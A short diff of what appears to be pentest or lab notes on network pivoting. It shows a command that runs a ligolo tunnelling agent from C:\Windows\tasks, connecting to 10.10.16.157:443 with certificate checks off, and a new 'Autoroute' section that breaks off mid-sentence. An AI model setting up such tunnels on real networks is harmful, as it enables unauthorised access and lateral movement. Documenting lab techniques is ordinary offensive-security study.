@@ -28,3 +28,7 @@ We can run the agent (after uploading it) with
 ```cmd
 C:\Windows\tasks\ligolo-windows-agent.exe -connect 10.10.16.157:443 -ignore-cert
 ```
+
+
+## Autoroute
+We need to add the internal IP range so that it gets routed. We can
